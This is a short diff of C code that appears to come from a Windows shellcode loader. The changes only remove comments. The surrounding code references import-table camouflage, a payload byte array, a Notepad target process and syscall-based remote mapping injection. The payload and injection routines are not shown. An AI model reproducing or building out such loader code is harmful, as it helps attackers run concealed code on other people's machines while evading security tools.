@@ -4,7 +4,6 @@
 #include "Debug.h"
 #include "IatCamouflage.h"
 
-// comment to inject to the local process
 #define TARGET_PROCESS	Notepad_JOAA
 
 UCHAR Payload[] = {
@@ -69,7 +68,6 @@ BOOL main() {
 
 
 #endif 
-	// TARGET_PROCESS
 #ifndef TARGET_PROCESS
 	if (!RemoteMappingInjectionViaSyscalls((HANDLE)-1, Payload, sizeof(Payload), TRUE)) {
 #ifdef DEBUG
@@ -79,6 +77,5 @@ BOOL main() {
 }
 
 #endif 
-	// !TARGET_POCESS
 	return TRUE;
 }
